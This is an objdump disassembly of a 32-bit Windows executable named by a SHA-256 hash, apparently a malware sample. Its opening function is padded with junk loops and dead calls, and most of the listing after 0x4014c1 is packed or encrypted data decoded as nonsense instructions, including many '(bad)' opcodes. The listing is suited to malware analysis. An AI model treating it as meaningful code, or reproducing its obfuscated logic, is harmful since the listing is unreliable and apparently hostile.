
18d8f43a66cafb21f8cf692266414ea81ad6d4b58ca5f26684ed6a6b55f3a136.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9eb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9ef
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42a9f3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42a9fb
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42a9ff
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42aa03
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42aa07
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax+0x72a705df],esi
  4014ce:	jl     0x401522
  4014d0:	cmp    al,BYTE PTR [ebx+0x47838383]
  4014d6:	pusha  
  4014d7:	add    DWORD PTR [ebx+0x3e28312a],0x26
  4014de:	cmp    ah,BYTE PTR [eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	ret    0x7273
  4014e8:	jae    0x40155c
  4014ea:	dec    ebx
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	dec    eax
  40157c:	ret    0x624d
  40157f:	push   ss
  401580:	(bad)  [edx+eiz*4-0x7e]
  401584:	out    dx,al
  401585:	cmp    edi,DWORD PTR [ebx+0x694293c4]
  40158b:	pop    ebp
  40158c:	daa    
  40158d:	xchg   edi,eax
  40158e:	sbb    DWORD PTR [eax-0x74],edi
  401591:	nop
  401592:	fidivr WORD PTR [esi+0x59035a71]
  401598:	lea    ebx,ds:0xe9628d8
  40159e:	mov    ch,0xf9
  4015a0:	sbb    ebx,esi
  4015a2:	jl     0x40160d
  4015a4:	cmp    BYTE PTR [esi-0xa596f06],dl
  4015aa:	xchg   ecx,eax
  4015ab:	sub    al,0x1a
  4015ad:	jp     0x40161d
  4015af:	or     al,0xd2
  4015b1:	ret    0x87bb
  4015b4:	inc    BYTE PTR [edi-0x4ab48860]
  4015ba:	adc    dh,BYTE PTR [ecx-0x7]
  4015bd:	pop    edx
  4015be:	cmp    al,0x1c
  4015c0:	sub    ebx,DWORD PTR [edi+0x3d]
  4015c3:	sbb    DWORD PTR [esi-0x54],esi
  4015c6:	jbe    0x4015a6
  4015c8:	in     eax,0x89
  4015ca:	out    dx,eax
  4015cb:	inc    ecx
  4015cc:	loop   0x4015f5
  4015ce:	push   cs
  4015cf:	repz and esi,DWORD PTR [esi]
  4015d2:	push   esp
  4015d3:	jno    0x401594
  4015d5:	loop   0x401614
  4015d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d8:	mov    edi,0x5c8ed44c
  4015dd:	push   esi
  4015de:	or     DWORD PTR [ebx+ebx*4-0x36],esp
  4015e2:	iret   
  4015e3:	ins    BYTE PTR es:[edi],dx
  4015e4:	xchg   esp,eax
  4015e5:	or     edi,ebx
  4015e7:	call   0x3dae:0x47bcf53a
  4015ee:	xchg   ebp,eax
  4015ef:	pushw  0x16
  4015f2:	mov    esi,0x43ed043b
  4015f7:	push   eax
  4015f8:	dec    ebx
  4015f9:	inc    ebp
  4015fa:	inc    edi
  4015fb:	xor    ch,bl
  4015fd:	inc    esi
  4015fe:	xor    bl,ch
  401600:	je     0x401590
  401602:	mov    eax,ds:0xc55c110c
  401607:	sub    DWORD PTR [ebx+0x9],esi
  40160a:	and    BYTE PTR [esi],ah
  40160c:	(bad)  
  40160d:	push   0x48afb992
  401612:	push   ebp
  401613:	adc    eax,0xd3eedbd9
  401618:	rcl    al,1
  40161a:	sub    BYTE PTR [ebx+0x7cf48426],ah
  401620:	mov    esp,0x33bfcb5f
  401625:	xchg   ecx,eax
  401626:	sub    esp,DWORD PTR [eax+0x15]
  401629:	lahf   
  40162a:	pushf  
  40162b:	xor    al,0x7
  40162d:	add    eax,0xc4133fc7
  401632:	pop    es
  401633:	int    0x2f
  401635:	loopne 0x4015c7
  401637:	xor    edi,DWORD PTR [ebx+0x421b5599]
  40163d:	fcmovb st,st(2)
  40163f:	cmc    
  401640:	inc    esp
  401641:	mov    ebp,0xcea8da8d
  401646:	enter  0xf72f,0xff
  40164a:	cmp    BYTE PTR [esp+edi*8+0x1fce0d1b],ah
  401651:	cmp    bl,dl
  401653:	pop    edi
  401654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401655:	or     BYTE PTR [edi-0x4b438628],bh
  40165b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40165c:	fisubr DWORD PTR [ebx]
  40165e:	lea    ebx,[esi]
  401660:	xor    eax,DWORD PTR [edi-0x49]
  401663:	and    DWORD PTR [esi+0x5d],ebx
  401666:	repnz ror bl,cl
  401669:	call   0x69ec4583
  40166e:	jnp    0x401691
  401670:	mov    BYTE PTR [ebp-0x789e8a0a],bh
  401676:	(bad)  
  401678:	js     0x4016c3
  40167a:	dec    esi
  40167b:	ins    BYTE PTR es:[edi],dx
  40167c:	loopne 0x4016bc
  40167e:	mov    esp,0xe6abe5da
  401683:	iret   
  401684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401685:	jns    0x401686
  401687:	add    dh,BYTE PTR [ecx]
  401689:	cs jmp 0x40167a
  40168c:	lods   eax,DWORD PTR ds:[esi]
  40168d:	repz mov ds:0x24891444,al
  401693:	jno    0x4016b5
  401695:	retf   
  401696:	daa    
  401697:	mov    ah,BYTE PTR [ebp+0x6e]
  40169a:	enter  0x49fd,0x38
  40169e:	sbb    ecx,ebp
  4016a0:	gs popa 
  4016a2:	in     al,0xc8
  4016a4:	xor    ebx,DWORD PTR [ebx+0x3b]
  4016a7:	sahf   
  4016a8:	or     ch,BYTE PTR [esi]
  4016aa:	jmp    0x9140:0xc7fc8901
  4016b1:	sti    
  4016b2:	push   0x297b8776
  4016b7:	fisttp QWORD PTR [edi]
  4016b9:	lds    eax,FWORD PTR [edx]
  4016bb:	xchg   DWORD PTR [edi+0x6c50bc89],ebp
  4016c1:	xchg   ecx,eax
  4016c2:	aam    0x6f
  4016c4:	or     DWORD PTR [edx-0x2],ebx
  4016c7:	inc    DWORD PTR [edx+0x2b50c7a]
  4016cd:	push   edx
  4016ce:	mov    ebp,0x3663e676
  4016d3:	jns    0x40168a
  4016d5:	(bad)  
  4016d6:	pop    ebp
  4016d7:	cmp    eax,0x1eefa981
  4016dc:	sbb    esp,DWORD PTR ds:0x942ca9b9
  4016e2:	add    BYTE PTR [edi],dh
  4016e4:	dec    ecx
  4016e5:	dec    esp
  4016e6:	push   esi
  4016e7:	ret    
  4016e8:	fcom   DWORD PTR [ebx]
  4016ea:	jo     0x401670
  4016ec:	mov    edx,0x4e1dc6d2
  4016f1:	cwde   
  4016f2:	dec    ecx
  4016f3:	jbe    0x40176c
  4016f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f6:	je     0x401746
  4016f8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016fa:	pop    ecx
  4016fb:	(bad)  
  4016fd:	cmp    BYTE PTR [ecx],dl
  4016ff:	xor    BYTE PTR ds:0xdc31cd00,bl
  401705:	rcl    BYTE PTR [di+0x55],0x7
  40170a:	mov    ecx,0xd988fa93
  40170f:	cmp    BYTE PTR [edi-0x181ee903],0x9f
  401716:	cmp    al,0x47
  401718:	in     al,dx
  401719:	dec    eax
  40171a:	mov    al,0xfe
  40171c:	gs sahf 
  40171e:	jp     0x40175b
  401720:	adc    al,0x6c
  401722:	test   BYTE PTR [edi],bl
  401724:	inc    ecx
  401725:	pop    esi
  401726:	xchg   esi,eax
  401727:	out    dx,al
  401728:	sbb    ecx,DWORD PTR [ebp-0x43]
  40172b:	imul   edx,DWORD PTR ds:[esi+0x6f],0xa7bdde9b
  401733:	inc    ebp
  401734:	jmp    0xd4d7:0xf5a32b43
  40173b:	scas   eax,DWORD PTR es:[edi]
  40173c:	mov    ds:0xfa5c1fa5,eax
  401741:	and    eax,0x2d6c76eb
  401746:	and    al,0xdb
  401748:	cwde   
  401749:	mov    ebx,gs
  40174b:	cmp    eax,0x9197c23e
  401750:	rcl    dh,cl
  401752:	push   esp
  401753:	in     eax,dx
  401754:	ret    0x763b
  401757:	inc    edx
  401758:	sub    BYTE PTR [edi],0xc8
  40175b:	js     0x4017d7
  40175d:	jecxz  0x4016ef
  40175f:	mov    ds:0x55824d3d,al
  401764:	add    esp,DWORD PTR [eax+0x26]
  401767:	stos   DWORD PTR es:[edi],eax
  401768:	mov    cl,0x56
  40176a:	xor    eax,0x1d7e21b3
  40176f:	dec    ebx
  401770:	lds    ebp,FWORD PTR [ecx]
  401772:	data16 jecxz 0x401776
  401775:	fwait
  401776:	retf   0xb2dd
  401779:	leave  
  40177a:	cwde   
  40177b:	xchg   esi,eax
  40177c:	enter  0x9dd4,0xf
  401780:	jnp    0x401800
  401782:	push   edi
  401783:	into   
  401784:	jmp    0x4017bf
  401786:	outs   dx,BYTE PTR ds:[esi]
  401787:	fidivr DWORD PTR [ebp+0x1aed6f98]
  40178d:	fisub  DWORD PTR [eax+0x1a]
  401790:	(bad)  
  401791:	leave  
  401792:	push   edx
  401793:	cs mov esp,0xc24257f4
  401799:	test   edi,esi
  40179b:	dec    esi
  40179c:	icebp  
  40179d:	jl     0x4017f0
  40179f:	sbb    ecx,DWORD PTR [eax+0x2a]
  4017a2:	mov    ah,0xcc
  4017a4:	outs   dx,DWORD PTR ds:[esi]
  4017a5:	out    dx,eax
  4017a6:	sub    dl,BYTE PTR ds:0xe38ee714
  4017ac:	out    dx,eax
  4017ad:	push   edx
  4017ae:	add    BYTE PTR [edx+edx*1-0x484cfb7e],cl
  4017b5:	push   edx
  4017b6:	sti    
  4017b7:	xor    ecx,eax
  4017b9:	xchg   ebp,eax
  4017ba:	and    DWORD PTR ds:0x5da389f8,esi
  4017c0:	adc    al,0x6a
  4017c2:	and    BYTE PTR [eax+edi*2],cl
  4017c5:	jno    0x40181a
  4017c7:	les    ebx,FWORD PTR [edi+0x58]
  4017ca:	outs   dx,BYTE PTR ds:[esi]
  4017cb:	mov    dh,0x8f
  4017cd:	dec    ebp
  4017ce:	hlt    
  4017cf:	cmp    ecx,edi
  4017d1:	sahf   
  4017d2:	sub    al,0xb6
  4017d4:	call   0xad25:0xd5b7d85c
  4017db:	mov    esp,0x121fcdd6
  4017e0:	fidiv  DWORD PTR [edi+ebp*1+0x1e]
  4017e4:	push   ss
  4017e5:	into   
  4017e6:	imul   eax,DWORD PTR [ecx],0xffffffcb
  4017e9:	dec    esi
  4017ea:	sbb    eax,DWORD PTR [edi+0x18af296c]
  4017f0:	sub    eax,0x6e011975
  4017f5:	cld    
  4017f6:	into   
  4017f7:	fldcw  WORD PTR [ecx+0x57]
  4017fa:	(bad)  
  4017fb:	cld    
  4017fc:	mov    dl,0x9a
  4017fe:	inc    esp
  4017ff:	pop    ss
  401800:	mov    bl,0x81
  401802:	and    al,0xf8
  401804:	mov    eax,0xc2b8a2db
  401809:	int    0x4e
  40180b:	lea    ebx,[edx+0x52]
  40180e:	mov    ds:0x34779ba0,eax
  401813:	(bad)  
  401814:	jle    0x40188c
  401816:	push   esp
  401817:	ja     0x4017db
  401819:	hlt    
  40181a:	cwde   
  40181b:	aas    
  40181c:	and    eax,0xd49c157
  401821:	inc    edi
  401822:	retf   
  401823:	jne    0x40186c
  401825:	push   ds
  401826:	mov    ecx,0x3b384b12
  40182b:	inc    esi
  40182c:	and    edx,DWORD PTR [edi+0x46]
  40182f:	lahf   
  401830:	(bad)
  401833:	add    al,0x5
  401835:	fld    QWORD PTR [edx-0x107ec410]
  40183b:	push   ebx
  40183c:	loop   0x4018ad
  40183e:	mov    ds,WORD PTR [edx+0x19dff44e]
  401844:	or     DWORD PTR [esi+0x3a55fc39],esi
  40184a:	enter  0x81bc,0x7e
  40184e:	push   0x29
  401850:	in     al,dx
  401851:	stos   BYTE PTR es:[edi],al
  401852:	pop    eax
  401853:	test   eax,0xedf931b7
  401858:	mov    al,0xa3
  40185a:	sub    DWORD PTR [eax+0x23467c1f],esp
  401860:	jbe    0x401831
  401862:	repz jl 0x40189b
  401865:	jb     0x4018cd
  401867:	xor    BYTE PTR [edi+0x5aa6ce66],dl
  40186d:	cmp    DWORD PTR fs:[eax+esi*1-0x1d],ecx
  401872:	ins    DWORD PTR es:[edi],dx
  401873:	inc    ecx
  401874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401875:	(bad)  
  401877:	test   eax,0x9117628b
  40187c:	cmp    BYTE PTR [esi],al
  40187e:	imul   eax,esi,0xdcb46655
  401884:	sub    DWORD PTR [edi-0x638d49e2],ecx
  40188a:	add    BYTE PTR [ecx],dl
  40188c:	cmp    DWORD PTR [ebp+0x596c3bbd],esi
  401892:	mov    al,ds:0x133ee35b
  401897:	retf   0xce3
  40189a:	sbb    esp,DWORD PTR [esi]
  40189c:	dec    edx
  40189d:	retf   
  40189e:	mov    ds:0x6c456a2f,eax
  4018a3:	xor    BYTE PTR [edx],cl
  4018a5:	mov    dl,0x89
  4018a7:	push   eax
  4018a8:	jmp    0x63e40908
  4018ad:	loop   0x4018fc
  4018af:	shl    DWORD PTR [ecx-0x4929d213],1
  4018b5:	mov    bh,BYTE PTR [ebx+0x64de1ee1]
  4018bb:	mov    ds:0x4ec3d383,al
  4018c0:	into   
  4018c1:	push   edi
  4018c2:	aad    0x71
  4018c4:	das    
  4018c5:	jno    0x4018dc
  4018c7:	idiv   esi
  4018c9:	mov    WORD PTR [esi],?
  4018cb:	dec    esp
  4018cc:	and    DWORD PTR ds:0xd757c231,esi
  4018d2:	jo     0x40187d
  4018d4:	nop
  4018d5:	xchg   DWORD PTR [eax+0x17],esi
  4018d8:	xchg   esp,eax
  4018d9:	jp     0x40192f
  4018db:	mov    cl,0x93
  4018dd:	leave  
  4018de:	mov    dh,0x43
  4018e0:	mov    ebp,0x9d1d7647
  4018e5:	mov    BYTE PTR [ecx],al
  4018e7:	adc    al,BYTE PTR [ebx+0x4d]
  4018ea:	mov    edx,0x84739c11
  4018ef:	jmp    0x401942
  4018f1:	das    
  4018f2:	cmp    bl,BYTE PTR [edi+0x70ab241d]
  4018f8:	mov    esi,0xa75d1b7c
  4018fd:	idiv   BYTE PTR [esp+eax*4-0x64]
  401901:	fstp   QWORD PTR [esi]
  401903:	pop    ds
  401904:	sbb    BYTE PTR [eax],bl
  401906:	mov    esp,0x6adfc052
  40190b:	inc    edx
  40190c:	loop   0x4018ab
  40190e:	adc    eax,0x48b486c
  401913:	aas    
  401914:	inc    ebx
  401915:	pop    ebx
  401916:	(bad)  
  401917:	mov    ds:0x4d761b6c,al
  40191c:	or     eax,0x8ff6c9b0
  401921:	dec    ebx
  401922:	pop    ebx
  401923:	int    0xa2
  401925:	push   ss
  401926:	mov    al,0xbf
  401928:	jmp    0x64888520
  40192d:	push   edx
  40192e:	cmp    DWORD PTR [esi],eax
  401930:	shr    BYTE PTR [ecx-0x2b82786a],0x7a
  401937:	fist   WORD PTR [ecx]
  401939:	jl     0x4019b7
  40193b:	fs stos BYTE PTR es:[edi],al
  40193d:	pop    eax
  40193e:	xchg   bl,ah
  401940:	cmp    al,0xb5
  401942:	add    esi,eax
  401944:	test   al,0x9c
  401946:	popa   
  401947:	mov    ds:0x5457c39d,eax
  40194c:	aad    0x63
  40194e:	pop    ds
  40194f:	ds cdq 
  401951:	lods   eax,DWORD PTR ds:[esi]
  401952:	cmc    
  401953:	outs   dx,DWORD PTR ds:[esi]
  401954:	pop    esi
  401955:	stc    
  401956:	frstor [ebx-0x268d4400]
  40195c:	daa    
  40195d:	mov    ah,BYTE PTR [ebx+0x6]
  401960:	or     BYTE PTR [ecx],al
  401962:	xor    ch,dl
  401964:	push   ss
  401965:	adc    bh,dh
  401967:	xchg   esi,eax
  401968:	sub    esi,DWORD PTR [ecx+0x3a]
  40196b:	aaa    
  40196c:	aas    
  40196d:	sbb    BYTE PTR [edx-0x21],ah
  401970:	ds adc eax,0xafb43277
  401976:	xchg   esp,eax
  401977:	push   es
  401978:	js     0x401993
  40197a:	pop    ss
  40197b:	sub    BYTE PTR ss:[ecx+ebp*1],bl
  40197f:	bound  esi,QWORD PTR [esi-0x74]
  401982:	sbb    al,0x13
  401984:	add    ah,0xcd
  401987:	call   0xad74:0x13b4ea52
  40198e:	xor    al,0xa7
  401990:	pop    es
  401991:	push   ecx
  401992:	push   cs
  401993:	pop    ebp
  401994:	loope  0x4019bb
  401996:	(bad)  
  401997:	adc    dh,BYTE PTR [esi-0x101d5130]
  40199d:	mov    al,0xf7
  40199f:	shl    BYTE PTR [eax+0x1c],1
  4019a2:	test   eax,0x18555762
  4019a7:	sub    ah,BYTE PTR [ebp+0x3c]
  4019aa:	push   ebx
  4019ab:	inc    ebx
  4019ac:	pushf  
  4019ad:	scas   al,BYTE PTR es:[edi]
  4019ae:	sub    DWORD PTR [ebx-0x15],ebp
  4019b1:	inc    esi
  4019b2:	jge    0x401967
  4019b4:	pop    es
  4019b5:	and    al,0x36
  4019b7:	or     DWORD PTR [ebx],ebx
  4019b9:	and    edx,edx
  4019bb:	cmp    al,0x9e
  4019bd:	push   0xffffff91
  4019bf:	inc    edi
  4019c0:	js     0x4019c1
  4019c2:	xchg   edi,eax
  4019c3:	sbb    eax,0x569b638e
  4019c8:	cmovb  eax,eax
  4019cb:	dec    ecx
  4019cc:	mov    ch,0xf6
  4019ce:	test   BYTE PTR [eax],bl
  4019d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019d1:	out    0x6d,eax
  4019d3:	pop    esp
  4019d4:	add    edi,DWORD PTR [edx]
  4019d6:	test   DWORD PTR ds:0xfe59a57,edi
  4019dc:	jle    0x401a55
